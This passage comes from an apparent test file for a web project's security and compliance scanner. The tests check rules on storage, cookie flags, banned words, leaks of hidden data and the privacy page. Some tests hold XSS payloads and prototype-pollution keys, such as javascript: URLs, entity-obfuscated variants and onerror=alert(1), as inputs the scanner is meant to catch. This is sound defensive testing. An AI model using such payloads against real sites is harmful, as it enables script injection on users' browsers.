    j('<a href="', HTTPS, 'shop.ex/p">x</a>'),
  ]) {
    const res = scan(await makeRoot({ output: (o) => { o['index.html'] = o['index.html'].replace('</main>', `${add}</main>`); } }));
    expectFail(res, 'C8-OUT-SAFE');
  }
});

test('C8-OUT-SAFE: manifest.indexable≠true 인데 robots 허용', async () => {
  const res = scan(await makeRoot({ output: (o) => { o['robots.txt'] = 'User-agent: *\nAllow: /\n'; } }));
  expectFail(res, 'C8-OUT-SAFE');
});

test('C8-OUT-SAFE: manifest.indexable=true 면 robots 허용 가능', async () => {
  const res = scan(await makeRoot({
    output: (o) => { o['robots.txt'] = 'User-agent: *\nAllow: /\n'; },
    manifest: (dg) => manifestFor(dg, { indexable: true }),
  }));
  expectClean(res);
});

// ── 정규화 단위(§6-1) ───────────────────────────────────────
test('normalize: spaced/stripped 절차와 판정', async () => {
  const { normalizeLintText, compileBannedWords, lintText } = await import('../lib/normalize.mjs');
  const bw = compileBannedWords(BANNED_WORDS);
  assert.equal(normalizeLintText(j('a­', 'b​ c\t\n d'), 'spaced'), 'ab c d');
  assert.equal(normalizeLintText('a b  c', 'stripped'), 'abc');
  assert.deepEqual(lintText(KO.safe.normalize('NFD'), bw).map((h) => h.rule), ['L01']);
  assert.deepEqual(lintText(j(KO.expertN, '４명'), bw).map((h) => h.rule), ['L01']);
  assert.deepEqual(lintText(j('가', KO.purchase[0], ' ', KO.purchase[1], '장'), bw).map((h) => h.rule), ['L06']);
  assert.deepEqual(lintText(j(KO.safeStem, '·세척'), bw).map((h) => h.rule), ['L02']);
  assert.deepEqual(lintText('깨끗', bw), []);
});

test('실트리 소스 파일이 존재하면 테스트 픽스처와 무관하게 읽힌다(스모크)', () => {
  assert.ok(existsSync(SCANNER));
  assert.ok(readFileSync(SCANNER, 'utf8').length > 0);
});

// ── B3-4(R5): 위치·웹 저장소·쿠키·인라인 실행·서버 쿠키 발급 ───────────────
const GEO = j('geo', 'location');
const LS = j('local', 'Storage');
const SS = j('session', 'Storage');
const DOC_COOKIE = j('document.', 'cookie');
const JS_URL = j('java', 'script:');
const SET_COOKIE = j('Set-', 'Cookie');

/** 소스 한 파일 주입 → 해당 규칙 FAIL. */
async function failsWith(rule, file, text) {
  expectFail(scan(await makeRoot({ source: (s) => { s[file] = text; } })), rule);
}
/** 소스 한 파일 주입 → 해당 규칙 없음. */
async function cleanOf(rule, file, text) {
  const res = scan(await makeRoot({ source: (s) => { s[file] = text; } }));
  assert.ok(!rulesOf(res, 'FAIL').includes(rule), `${file}: ${JSON.stringify(res.json?.findings)}`);
}

test('C5-GEO: navigator.geolocation 은 client/src 어디서나(지도 폴더·테스트 포함) 실패, 키 접근 우회도', async () => {
  const use = j('export const g = () => navigator.', GEO, '.getCurrentPosition(() => {});\n');
  for (const f of ['client/src/vet/useRegion.ts', 'client/src/map/useDefaultRegion.ts', 'client/src/vet/useRegion.test.ts']) await failsWith('C5-GEO', f, use);
  await failsWith('C5-GEO', 'client/src/vet/a.ts', j("export const g = navigator['", GEO, "'];\n"));
  await failsWith('C5-GEO', 'client/src/vet/b.ts', 'export const w = (n) => n.watchPosition(() => {});\n');
  await cleanOf('C5-GEO', 'client/src/vet/c.ts', j('// ', GEO, ' 는 쓰지 않는다(D14)\nexport const x = 1;\n'));
});

test('C9-STORAGE: localStorage·sessionStorage 는 lib/storage.ts 만(테스트 예외), 키 접근 우회도', async () => {
  await failsWith('C9-STORAGE', 'client/src/home/x.ts', j("export const f = () => ", LS, ".setItem('a', 'b');\n"));
  await failsWith('C9-STORAGE', 'client/src/home/y.ts', j('export const f = () => ', SS, '.clear();\n'));
  await failsWith('C9-STORAGE', 'client/src/home/z.tsx', j("export const s = window['", LS, "'];\n"));
  await cleanOf('C9-STORAGE', 'client/src/lib/storage.ts', j("export const read = (k) => window.", LS, '.getItem(k);\n'));
  await cleanOf('C9-STORAGE', 'client/src/home/x.test.ts', j('beforeEach(() => ', LS, '.clear());\n'));
  await cleanOf('C9-STORAGE', 'client/src/home/w.ts', j('// 기본 = 브라우저 ', LS, '\nexport const w = 1;\n'));
});

test('C9-STORAGE: document.cookie·cookieStore 는 client/src 전체(테스트 포함) 실패', async () => {
  await failsWith('C9-STORAGE', 'client/src/save/sid.ts', j("export const sid = () => ", DOC_COOKIE, ";\n"));
  await failsWith('C9-STORAGE', 'client/src/save/sid.test.ts', j("it('x', () => { ", DOC_COOKIE, " = 'a=b'; });\n"));
  await failsWith('C9-STORAGE', 'client/src/save/k.ts', "export const k = document['cookie'];\n");
  await failsWith('C9-STORAGE', 'client/src/save/c.ts', 'export const c = () => cookieStore.get("ws_sid");\n');
});

test('C8-SRC-SAFE: 클라 소스의 javascript: URL·on*= 마크업·문자열 핸들러 → 실패, 테스트·정상 JSX 핸들러 → 통과', async () => {
  await failsWith('C8-SRC-SAFE', 'client/src/home/A.tsx', j("export const A = () => <a href=\"", JS_URL, "void(0)\">x</a>;\n"));
  await failsWith('C8-SRC-SAFE', 'client/src/home/b.ts', j("export const h = '", JS_URL, "alert(1)';\n"));
  await failsWith('C8-SRC-SAFE', 'client/src/home/c.ts', "export const m = '<img src=x onerror=alert(1)>';\n");
  await failsWith('C8-SRC-SAFE', 'client/src/home/d.ts', "export const f = (el) => el.setAttribute('onclick', 'go()');\n");
  await failsWith('C8-SRC-SAFE', 'client/src/home/e.ts', "export const f = (el) => { el.onclick = 'go()'; };\n");
  await failsWith('C8-SRC-SAFE', 'client/src/home/F.tsx', 'export const F = () => <button onClick="go()">x</button>;\n');
  await cleanOf('C8-SRC-SAFE', 'client/src/home/G.tsx', 'export const G = ({ go }) => <button onClick={go}>x</button>;\n');
  await cleanOf('C8-SRC-SAFE', 'client/src/home/h.ts', "export const f = (o) => { o.ongoing = 'yes'; };\n");
  await cleanOf('C8-SRC-SAFE', 'client/src/home/i.test.ts', j("const hostile = ['", JS_URL, "alert(1)'];\n"));
});

test('C8-SRC-SAFE: client/index.html 의 on*= 속성·javascript: 값(공백·탭 우회 포함) → 실패', async () => {
  for (const html of [
    '<!doctype html><html><body onload="go()"><div id="root"></div></body></html>',
    j('<!doctype html><html><body><a href="java\tscript:go()">x</a></body></html>'),
    j('<!doctype html><html><body><a href=" ', JS_URL, 'go()">x</a></body></html>'),
  ]) await failsWith('C8-SRC-SAFE', 'client/index.html', html);
  await cleanOf('C8-SRC-SAFE', 'client/index.html', '<!doctype html><html><body><div id="root"></div><script type="module" src="/src/main.tsx"></script></body></html>');
});

test('C8-OUT-SAFE: 산출물 on*= 속성·javascript:/vbscript: 값(엔티티·탭 우회 포함) → 실패', async () => {
  for (const add of [
    '<button onclick="go()">x</button>',
    '<img src="/a.png" onerror="go()">',
    j('<form action="', JS_URL, 'go()"></form>'),
    '<a href="&#106;avascript:go()">x</a>',
    '<a href="java&#9;script:go()">x</a>',
    '<a href="vbscript:go">x</a>',
  ]) {
    const res = scan(await makeRoot({ output: (o) => { o['index.html'] = o['index.html'].replace('</footer>', `</footer>${add}`); } }));
    expectFail(res, 'C8-OUT-SAFE');
  }
});

test('C9-COOKIE: 서버 쿠키 발급은 save/magic.routes.ts·auth/auth.routes.ts 만, 속성 직렬화는 save/cookie.ts·auth/auth.routes.ts 만', async () => {
  const emit = j("export const f = (res) => res.setHeader('", SET_COOKIE, "', 'a=b');\n");
  // 직렬화 파일(cookie.ts)은 정상 템플릿(ser)과 함께 넣어 플래그 규칙이 아닌 발급 규칙으로 실패함을 본다.
  const ser = "export const c = (v, secure) => `ws_x=${v}; Max-Age=60; Path=/; HttpOnly; SameSite=Lax${secure ? '; Secure' : ''}`;\n";
  for (const [f, text] of [['server/src/app.ts', emit], ['server/src/save/session.ts', emit], ['server/src/save/cookie.ts', ser + emit]]) await failsWith('C9-COOKIE', f, text);
  await failsWith('C9-COOKIE', 'server/src/reaction/routes.ts', "export const f = (res) => res.cookie('rk', 'x');\n");
  await failsWith('C9-COOKIE', 'server/src/vet/x.ts', "export const f = (res) => res.clearCookie('ws_sid');\n");
  for (const f of ['server/src/save/session.ts', 'server/src/app.ts']) await failsWith('C9-COOKIE', f, ser);
  await cleanOf('C9-COOKIE', 'server/src/save/magic.routes.ts', emit);
  await cleanOf('C9-COOKIE', 'server/src/auth/auth.routes.ts', ser + emit);
  for (const f of ['server/src/save/cookie.ts', 'server/src/auth/auth.routes.ts']) await cleanOf('C9-COOKIE', f, ser);
  await cleanOf('C9-COOKIE', 'server/src/__tests__/save.magic.test.ts', emit + ser);
  await cleanOf('C9-COOKIE', 'server/src/save/magic.routes.ts', 'export const read = (req) => req.headers.cookie;\n');
});

// QA-M D3(심층 방어): 허용 직렬화 파일의 쿠키 템플릿 플래그.
test('C9-COOKIE 플래그: cookie.ts·auth.routes.ts 템플릿에 HttpOnly·SameSite(Lax|Strict)·Secure(조건부 허용) 없으면 실패', async () => {
  const good = (name, path, site) => `export const c = (v, secure) => \`${name}=\${v}; Max-Age=60; Path=${path}; HttpOnly; SameSite=${site}\${secure ? '; Secure' : ''}\`;\n`;
  const okSid = good('ws_sid', '/', 'Lax');
  const okRt = good('ws_op_rt', '/auth', 'Strict');
  await cleanOf('C9-COOKIE', 'server/src/save/cookie.ts', okSid);
  await cleanOf('C9-COOKIE', 'server/src/auth/auth.routes.ts', okRt);
  await cleanOf('C9-COOKIE', 'server/src/save/cookie.ts', 'export const c = (v) => `ws_sid=${v}; Max-Age=60; Path=/; HttpOnly; SameSite=Lax; Secure`;\n');
  for (const [f, ok] of [['server/src/save/cookie.ts', okSid], ['server/src/auth/auth.routes.ts', okRt]]) {
    for (const bad of [
      ok.replace('; HttpOnly', ''),
      ok.replace("${secure ? '; Secure' : ''}", ''),
      ok.replace(/; SameSite=(Lax|Strict)/, ''),
      ok.replace(/SameSite=(Lax|Strict)/, 'SameSite=None'),
      'export const c = (v) => v;\n',
    ]) await failsWith('C9-COOKIE', f, bad);
  }
  // 발급 줄에 secure=false 리터럴(조건부 Secure 무력화)
  await failsWith('C9-COOKIE', 'server/src/save/magic.routes.ts', j("export const f = (res, sid) => res.setHeader('", SET_COOKIE, "', serializeSessionCookie(sid, false));\n"));
  await cleanOf('C9-COOKIE', 'server/src/save/magic.routes.ts', j("export const f = (res, sid, cfg) => res.setHeader('", SET_COOKIE, "', serializeSessionCookie(sid, cfg.secureCookie));\n"));
});

// ── R6 F2a: 사전 압축 사본(.br/.gz) — 텍스트 스캔 제외, 대신 해제 = 원본 바이트 ─────────────
test('C8-OUT-SAFE 압축 사본: 원본과 같은 .br/.gz 는 깨끗, 다른 내용·고아·손상은 FAIL', async () => {
  const dist = (root) => join(root, 'client', 'dist');
  const ok = await makeRoot({ output: noop });
  for (const f of ['index.html', 'hamster/golden/index.html', 'data/catalog.v1.abcd1234.json']) {
    const src = readFileSync(join(dist(ok), ...f.split('/')));
    writeFileSync(join(dist(ok), ...f.split('/')) + '.br', brotliCompressSync(src));
    writeFileSync(join(dist(ok), ...f.split('/')) + '.gz', gzipSync(src));
  }
  expectClean(scan(ok, '--require-output'));

  // 사본만 다른 내용(금지어 포함) — 서빙될 수 있는 바이트가 스캔한 원본과 다름 → FAIL
  const forged = await makeRoot({ output: noop });
  const idx = join(dist(forged), 'index.html');
  writeFileSync(`${idx}.br`, brotliCompressSync(Buffer.from(readFileSync(idx, 'utf8').replace('지금 필요한 것', j('최저', '가 모음')))));
  const r1 = scan(forged, '--require-output');
  expectFail(r1, 'C8-OUT-SAFE');
  assert.match(JSON.stringify(r1.json.findings), /index\.html\.br/);

  const orphan = await makeRoot({ output: noop });
  writeFileSync(join(dist(orphan), 'ghost.html.gz'), gzipSync(Buffer.from('<p>x</p>')));
  expectFail(scan(orphan, '--require-output'), 'C8-OUT-SAFE');

  const broken = await makeRoot({ output: noop });
  writeFileSync(join(dist(broken), 'robots.txt.gz'), 'not gzip');
  expectFail(scan(broken, '--require-output'), 'C8-OUT-SAFE');
});

// ── 76 방어 규칙: C3-TAXON(L-1) · C3-OUT-TAXON(L-2) · C3-OUT-SRC(계획 73 S4) ─────────────
const WS_RE = /<script id="ws-data" type="application\/json">([\s\S]*?)<\/script>/;
/** 골든 페이지 ws-data 를 파싱해 fn 으로 바꾼다(문자열 치환 없이 구조 변이). */
const withWs = (fn) => (o) => {
  const html = o['hamster/golden/index.html'];
  const d = JSON.parse(WS_RE.exec(html)[1]);
  fn(d);
  o['hamster/golden/index.html'] = html.replace(WS_RE, () => `<script id="ws-data" type="application/json">${JSON.stringify(d)}</script>`);
};
/** v2 로 변환: requirement.source → 최상위 sources 표 + sourceRefs, searchLinks 없음. */
const toV2 = (d, sources = [{ url: j(HTTPS, 'example.org/care'), title: 'care guide' }]) => {
  d.v = 2;
  d.sources = sources;
  for (const q of d.data.requirements) {
    delete q.source;
    delete q.searchLinks;
    q.searchKeyword ??= 'care guide'; // 실제 PublicRequirement 는 항상 searchKeyword 를 가진다(디코더가 필수로 본다)
    q.sourceRefs = sources.map((_, i) => i);
  }
};

test('C3-TAXON: 노출 타입 taxonId 빈 문자열 → FAIL(산출물 없어도)', async () => {
  const res = scan(await makeRoot({ seed: (d) => { d['animal-types.json'][0].taxonId = ''; } }));
  expectFail(res, 'C3-TAXON');
  assert.equal(res.json.outputs, 'NOT RUN');
});
test('C3-TAXON clean: 비노출(PLANNED) 타입 taxonId null 은 대상 아님', async () => {
  expectClean(scan(await makeRoot()));
});

// L-2: 비노출 Taxon 의 id·legal.note 가 산출물 어디에도 없어야 한다. 노트 문장은 합성 자리표시(법 사실 아님).
const HIDDEN_NOTE = '픽스처 법 메모 <비공개> & 검토 전';
const hideTaxon = (d) => {
  Object.assign(d['taxa.json'][0], { reviewStatus: 'DRAFT', reviewerType: 'AI_DRAFT', verifiedBy: null, verifiedAt: null });
  d['taxa.json'][0].legal.note = HIDDEN_NOTE;
};
const BSL = String.fromCharCode(0x5c);
const HTML_NOTE = HIDDEN_NOTE.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
const SCRIPT_NOTE = HIDDEN_NOTE.replace(/</g, `${BSL}u003c`).replace(/>/g, `${BSL}u003e`).replace(/&/g, `${BSL}u0026`);
const L2_LEAKS = [
  ['HTML 본문에 Taxon id', (o) => { o['index.html'] = o['index.html'].replace('</main>', '<p>tx-fixture</p></main>'); }, 'id'],
  ['HTML 본문에 legal.note(HTML 이스케이프)', (o) => { o['index.html'] = o['index.html'].replace('</main>', `<p>${HTML_NOTE}</p></main>`); }, 'legal.note'],
  ['ws-data 에 legal.note(<script> JSON 이스케이프)', (o) => {
    o['hamster/golden/index.html'] = o['hamster/golden/index.html'].replace('"testimonials":[]', () => `"testimonials":[],"x":"${SCRIPT_NOTE}"`);
  }, 'legal.note'],
  ['카탈로그 JSON 에 legal.note', (o) => {
    const c = JSON.parse(o['data/catalog.v1.abcd1234.json']);
    c.careProfiles[0].note = HIDDEN_NOTE;
    o['data/catalog.v1.abcd1234.json'] = JSON.stringify(c);
  }, 'legal.note'],
  ['JS 번들에 Taxon id', (o) => { o['assets/index-abc.js'] = 'export const t = "tx-fixture";\n'; }, 'id'],
];
for (const [name, leak, what] of L2_LEAKS) {
  test(`C3-OUT-TAXON: 비노출 Taxon ${name} → FAIL`, async () => {
    const res = scan(await makeRoot({ seed: hideTaxon, output: leak }));
    expectFail(res, 'C3-OUT-TAXON');
    assert.ok(res.json.findings.some((f) => f.rule === 'C3-OUT-TAXON' && f.message.includes(`tx-fixture 의 ${what}`)), JSON.stringify(res.json.findings));
  });
}
test('C3-OUT-TAXON clean: Taxon 노출(VERIFIED)이면 id·note 가 산출물에 있어도 통과 / 비노출이어도 산출물에 없으면 통과', async () => {
  const shown = await makeRoot({
    seed: (d) => { d['taxa.json'][0].legal.note = HIDDEN_NOTE; },
    output: (o) => { o['index.html'] = o['index.html'].replace('</main>', `<p>tx-fixture ${HTML_NOTE}</p></main>`); },
  });
  expectClean(scan(shown));
  expectClean(scan(await makeRoot({ seed: hideTaxon, output: noop })));
});

// 계획 73 S4: ws-data v2(최상위 sources 표 + sourceRefs, searchLinks 없음). v1 도 계속 수용.
test('C3-OUT-SRC clean: v2 정상(표 1·참조 1) / v1 그대로', async () => {
  expectClean(scan(await makeRoot({ output: withWs((d) => toV2(d)) })));
  expectClean(scan(await makeRoot({ output: noop })));
});
const SRC_BAD = [
  ['범위 밖 인덱스', (d) => { toV2(d); d.data.requirements[0].sourceRefs = [0, 1]; }, /범위 밖 인덱스 1/],
  ['음수 인덱스', (d) => { toV2(d); d.data.requirements[0].sourceRefs = [-1, 0]; }, /범위 밖 인덱스 -1/],
  ['정수 아닌 인덱스', (d) => { toV2(d); d.data.requirements[0].sourceRefs = ['0']; }, /범위 밖 인덱스 "0"/],
  ['미참조 표 항목', (d) => { toV2(d, [{ url: j(HTTPS, 'example.org/a'), title: 'a' }, { url: j(HTTPS, 'example.org/b'), title: 'b' }]); d.data.requirements[0].sourceRefs = [0]; }, /sources\[1\] 미참조/],
  ['표 항목 키 초과', (d) => { toV2(d, [{ url: j(HTTPS, 'example.org/a'), title: 'a', accessedAt: '2026-09-30' }]); }, /허용 밖 키 accessedAt/],
  ['표 항목 형식', (d) => { toV2(d, ['x']); }, /sources\[0\] 형식/],
  ['sources 배열 아님', (d) => { toV2(d); d.sources = {}; }, /sources 형식/],
  ['source 잔존', (d) => { toV2(d); d.data.requirements[0].source = [{ url: j(HTTPS, 'example.org/care'), title: 'care guide' }]; }, /source 잔존/],
  ['searchLinks 잔존', (d) => { toV2(d); d.data.requirements[0].searchLinks = []; }, /searchLinks 잔존/],
  ['sourceRefs 배열 아님', (d) => { toV2(d); d.data.requirements[0].sourceRefs = 0; }, /sourceRefs 형식/],
  ['v1 에 sourceRefs(형식 혼합)', (d) => { d.data.requirements[0].sourceRefs = [0]; }, /v1 인데 requirement/],
  ['v1 에 최상위 sources(형식 혼합)', (d) => { d.sources = []; }, /v1 인데 최상위 sources/],
  ['알 수 없는 v', (d) => { d.v = 3; }, /알 수 없는 v=3/],
  // S6 O-1·O-2: 디코더(ws-wire.ts decodeWsPage)와 같은 거부 조건.
  ['표 중복 {url,title}', (d) => { const s = { url: j(HTTPS, 'example.org/a'), title: 'a' }; toV2(d, [s, { ...s }]); }, /sources\[1\] 중복 표 항목/],
  ['v2 인데 최상위 sources 없음', (d) => { toV2(d); delete d.sources; }, /최상위 sources 없음/],
  ['v2 sources 가 null', (d) => { toV2(d); d.sources = null; }, /sources 형식/],
  ['v2 최상위 키 초과', (d) => { toV2(d); d.extra = 1; }, /최상위 키 집합 불일치/],
  ['v2 sourceRefs 없음', (d) => { toV2(d); delete d.data.requirements[0].sourceRefs; }, /sourceRefs 형식/],
  ['v2 searchKeyword 없음', (d) => { toV2(d); delete d.data.requirements[0].searchKeyword; }, /searchKeyword/],
  ['v2 data.requirements 없음', (d) => { toV2(d); delete d.data.requirements; }, /data\.requirements 배열 없음/],
];
for (const [name, mut, re] of SRC_BAD) {
  test(`C3-OUT-SRC: ${name} → FAIL`, async () => {
    const res = scan(await makeRoot({ output: withWs(mut) }));
    expectFail(res, 'C3-OUT-SRC');
    assert.ok(res.json.findings.some((f) => f.rule === 'C3-OUT-SRC' && re.test(f.message)), JSON.stringify(res.json.findings));
  });
}
test('C4-BANNED: v2 출처 표 제목(sources[].title)도 금지어 린트 대상', async () => {
  const res = scan(await makeRoot({ output: withWs((d) => toV2(d, [{ url: j(HTTPS, 'example.org/a'), title: j('추천 ', KO.best, ' 목록') }])) }));
  expectFail(res, 'C4-BANNED');
  assert.ok(res.json.findings.some((f) => f.rule === 'C4-BANNED' && /JSON title/.test(f.message)), JSON.stringify(res.json.findings));
});

// ── 보안 79: C3-OUT-SRC L-2(https 만)·L-3(위험 키) · C3-OUT-DRAFTSRC L-7(비노출 행 전용 출처) ─────────────
for (const [name, url] of [
  ['javascript:', j('java', 'script:alert(1)')],
  ['http:', j('htt', 'p://example.org/a')],
  ['상대 경로', '/data/x'],
  ['대문자 스킴', j('HTT', 'PS://example.org/a')],
]) {
  test(`C3-OUT-SRC L-2: v2 sources url ${name} → FAIL`, async () => {
    const res = scan(await makeRoot({ output: withWs((d) => toV2(d, [{ url, title: 'care guide' }])) }));
    expectFail(res, 'C3-OUT-SRC');
    assert.ok(res.json.findings.some((f) => f.rule === 'C3-OUT-SRC' && /https:\/\/ 아님/.test(f.message)), JSON.stringify(res.json.findings));
  });
}
for (const key of ['constructor', 'toString', '__proto__', 'hasOwnProperty']) {
  test(`C3-OUT-ID 235: ws-data data.${key} 프로토타입 이름 키 → 크래시 없이 알 수 없는 컬렉션 FAIL`, async () => {
    const res = scan(await makeRoot({ output: (o) => {
      o['hamster/golden/index.html'] = o['hamster/golden/index.html'].replace('"requirements":', () => `"${key}":[{"id":"x"}],"requirements":`);
    } }));
    assert.ok(res.json, `비정상 종료: ${res.stderr ?? ''}`);
    assert.ok(res.json.findings.some((f) => f.rule === 'C3-OUT-ID' && f.message.includes('알 수 없는 컬렉션')), JSON.stringify(res.json.findings));
  });
}
for (const key of ['__proto__', 'constructor', 'prototype']) {
  test(`C3-OUT-SRC L-3: ws-data 에 자체 키 ${key} → FAIL(v1·v2)`, async () => {
    const inject = (o) => {
      o['hamster/golden/index.html'] = o['hamster/golden/index.html'].replace('"testimonials":[]', () => `"testimonials":[],"${key}":{"polluted":1}`);
    };
    const v1 = scan(await makeRoot({ output: inject }));
    expectFail(v1, 'C3-OUT-SRC');
    assert.ok(v1.json.findings.some((f) => f.rule === 'C3-OUT-SRC' && f.message.includes(`금지 키 ${key}`)), JSON.stringify(v1.json.findings));
    const v2 = scan(await makeRoot({ output: (o) => { withWs((d) => toV2(d))(o); inject(o); } }));
    expectFail(v2, 'C3-OUT-SRC');
  });
}
test('C3-OUT-SRC L-3 clean: 값으로서의 "constructor" 문자열은 대상 아님', async () => {
  expectClean(scan(await makeRoot({ output: withWs((d) => toV2(d, [{ url: j(HTTPS, 'example.org/care'), title: 'constructor prototype' }])) })));
});

// L-7: 비노출(DRAFT) 행에만 있는 출처. 합성 자리표시 출처(사실 아님).
const DRAFT_URL = j(HTTPS, 'draft-only.example.org/src?a=1&b=2');
const DRAFT_TITLE = '초안 전용 출처 <제목> & 메모';
const draftSource = (d) => {
  // wheel SupplyItem 은 fixture 에서 DRAFT(AI_DRAFT) — 비노출 행.
  d['supply-items.json'][1].source = [{ url: DRAFT_URL, title: DRAFT_TITLE, accessedAt: '2026-09-30' }];
};
const L7_LEAKS = [
  ['HTML 본문에 url(HTML 이스케이프)', (o) => { o['index.html'] = o['index.html'].replace('</main>', `<p>${DRAFT_URL.replace(/&/g, '&amp;')}</p></main>`); }, 'url'],
  ['HTML 본문에 title(HTML 이스케이프)', (o) => { o['index.html'] = o['index.html'].replace('</main>', `<p>${DRAFT_TITLE.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</p></main>`); }, 'title'],
  ['ws-data v2 출처 표(<script> JSON 이스케이프)', withWs((d) => toV2(d, [{ url: DRAFT_URL, title: 'care guide' }])), 'url'],
  ['카탈로그 JSON 에 title', (o) => {
    const c = JSON.parse(o['data/catalog.v1.abcd1234.json']);
    c.supplyItems[0].source = [{ url: j(HTTPS, 'example.org/care'), title: DRAFT_TITLE, accessedAt: '2026-09-30' }];
    o['data/catalog.v1.abcd1234.json'] = JSON.stringify(c);
  }, 'title'],
  ['JS 번들에 url', (o) => { o['assets/index-abc.js'] = `export const u = ${JSON.stringify(DRAFT_URL)};\n`; }, 'url'],
];
for (const [name, leak, what] of L7_LEAKS) {
  test(`C3-OUT-DRAFTSRC: ${name} → FAIL`, async () => {
    const res = scan(await makeRoot({ seed: draftSource, output: leak }));
    expectFail(res, 'C3-OUT-DRAFTSRC');
    assert.ok(res.json.findings.some((f) => f.rule === 'C3-OUT-DRAFTSRC' && f.message.includes(`출처 ${what}(supplyItems#wheel)`)), JSON.stringify(res.json.findings));
  });
}
test('C3-OUT-DRAFTSRC clean: 산출물에 없으면 통과 / 같은 출처가 노출 행에도 있으면 대상 아님', async () => {
  expectClean(scan(await makeRoot({ seed: draftSource, output: noop })));
  const alsoShown = await makeRoot({
    seed: (d) => {
      draftSource(d);
      d['supply-items.json'][0].source.push({ url: DRAFT_URL, title: DRAFT_TITLE, accessedAt: '2026-09-30' }); // cage(노출 행)
    },
    output: (o) => { o['index.html'] = o['index.html'].replace('</main>', `<p>${DRAFT_URL.replace(/&/g, '&amp;')}</p></main>`); },
  });
  expectClean(scan(alsoShown));
});

// ── 보안 79 H-1: C3-OUT-REVIEWMETA — 검수 방식(reviewBasis)·서명 매니페스트 메타 산출물 0 ─────────────
for (const [name, leak, needle] of [
  ['HTML 본문에 reviewBasis', (o) => { o['index.html'] = o['index.html'].replace('</main>', '<p>reviewBasis</p></main>'); }, 'reviewBasis'],
  ['카탈로그 JSON 에 ROW_CHECKED', (o) => { o['data/catalog.v1.abcd1234.json'] = o['data/catalog.v1.abcd1234.json'].replace(/\}$/, ',"x":"ROW_CHECKED"}'); }, 'ROW_CHECKED'],
  ['JS 번들에 AI_RESEARCH_BULK', (o) => { o['assets/index-abc.js'] = 'export const b = "AI_RESEARCH_BULK";\n'; }, 'AI_RESEARCH_BULK'],
  ['JS 번들에 factHash', (o) => { o['assets/index-abc.js'] = 'export const h = { factHash: 1 };\n'; }, 'factHash'],
  ['sitemap 에 review-signatures', (o) => { o['sitemap.xml'] = o['sitemap.xml'].replace('</urlset>', '<!-- review-signatures --></urlset>'); }, 'review-signatures'],
]) {
  test(`C3-OUT-REVIEWMETA: ${name} → FAIL`, async () => {
    const res = scan(await makeRoot({ output: leak }));
    expectFail(res, 'C3-OUT-REVIEWMETA');
    assert.ok(res.json.findings.some((f) => f.rule === 'C3-OUT-REVIEWMETA' && f.message.includes(`"${needle}"`)), JSON.stringify(res.json.findings));
  });
}
test('C3-OUT-REVIEWMETA clean: 기본 산출물 통과', async () => {
  expectClean(scan(await makeRoot({ output: noop })));
});

// ── 계획 86 P11: C9-PRIVACY — /privacy 존재·모든 라우트 링크·자리표시(빌드는 항상 WARN — 차단은 운영 기동 검사)·기간 숫자 = policy.ts ─────────────
const c9Of = (res, severity) => (res.json?.findings ?? []).filter((f) => f.rule === 'C9-PRIVACY' && (!severity || f.severity === severity));
const withPrivacy = (opts) => (o) => { o['privacy/index.html'] = page(privacyMain(opts)); };

test('C9-PRIVACY clean: /privacy + 모든 라우트 링크 + 기간 = policy.ts → C9 0건', async () => {
  const res = scan(await makeRoot({ output: noop }));
  expectClean(res);
  assert.deepEqual(c9Of(res), []);
});

for (const [name, f, msg] of [
  ['변이 1 링크 제거(라우트 페이지 하나)', { output: (o) => { o['hamster/golden/index.html'] = o['hamster/golden/index.html'].replace('<a href="/privacy">개인정보 처리방침</a>', ''); } }, '링크'],
  ['변이 3 숫자 불일치(페이지 89 ≠ policy.ts 90)', { output: withPrivacy({ event: 89 }) }, 'EVENT_LOG_RETENTION_DAYS'],
  ['변이 3b policy.ts 값 변경(페이지 재빌드 없음)', { source: (s) => { s['server/src/privacy/policy.ts'] = POLICY_TS.replace('= 365;', '= 400;'); } , output: noop }, 'UNUSED_USER_RETENTION_DAYS'],
  ['변이 3c policy.ts 에 새 *_RETENTION_DAYS(페이지에 없음)', { source: (s) => { s['server/src/privacy/policy.ts'] = `${POLICY_TS}export const BACKUP_RETENTION_DAYS = 7;\n`; }, output: noop }, 'BACKUP_RETENTION_DAYS'],
  ['변이 3d policy.ts 없음', { source: (s) => { delete s['server/src/privacy/policy.ts']; }, output: noop }, 'policy.ts'],
  ['변이 4 페이지 누락(manifest 라우트 없음)', { output: (o) => { delete o['privacy/index.html']; }, manifest: (dg) => { const m = manifestFor(dg); m.routes = m.routes.filter((r) => r.kind !== 'PRIVACY'); return m; } }, '페이지 없음'],
  ['변이 4b 페이지 파일 누락(manifest 라우트만)', { output: (o) => { delete o['privacy/index.html']; } }, '페이지 없음'],
]) {
  test(`C9-PRIVACY: ${name} → FAIL`, async () => {
    const res = scan(await makeRoot(f));
    expectFail(res, 'C9-PRIVACY');
    assert.ok(c9Of(res, 'FAIL').some((x) => x.message.includes(msg)), JSON.stringify(c9Of(res)));
  });
}

test('C9-PRIVACY: 개발 빌드(manifest.mode=development) 자리표시는 WARN 만(exit 0)', async () => {
  const res = scan(await makeRoot({ output: withPrivacy({ placeholder: true }) }));
  expectClean(res);
  const w = c9Of(res, 'WARN');
  assert.equal(w.length, 1, JSON.stringify(c9Of(res)));
  assert.ok(w[0].message.includes('officerName') && w[0].file.endsWith('privacy/index.html') && !w[0].message.includes('운영 기동 차단됨'), JSON.stringify(w));
});

// 오케스트레이터 2026-10-25 후속 ①: 자리표시는 빌드에서 항상 WARN(CI 도커 빌드 NODE_ENV=production) — 차단은 운영 기동 검사(server/src/config/env.ts).
for (const [name, manifest, expectText] of [
  ['운영 manifest.mode=production', (dg) => manifestFor(dg, { mode: 'production' }), '운영 기동 차단됨'],
  ['mode 누락(운영 취급)', (dg) => { const m = manifestFor(dg); delete m.mode; return m; }, '운영 기동 차단됨'],
]) {
  test(`C9-PRIVACY: 자리표시 + ${name} → WARN(exit 0) + 메시지 "${expectText}"`, async () => {
    const res = scan(await makeRoot({ output: withPrivacy({ placeholder: true }), manifest }));
    expectClean(res);
    const w = c9Of(res, 'WARN');
    assert.equal(w.length, 1, JSON.stringify(c9Of(res)));
    assert.ok(w[0].message.includes(expectText) && w[0].message.includes('officerName'), JSON.stringify(w));
  });
}

test('C9-PRIVACY: 자리표시는 /privacy 밖 산출물(JS 번들)에서도 잡는다(WARN)', async () => {
  const res = scan(await makeRoot({ output: (o) => { o['assets/index-abc.js'] = `export const x = "${KENNY}";\n`; }, manifest: (dg) => manifestFor(dg, { mode: 'production' }) }));
  expectClean(res);
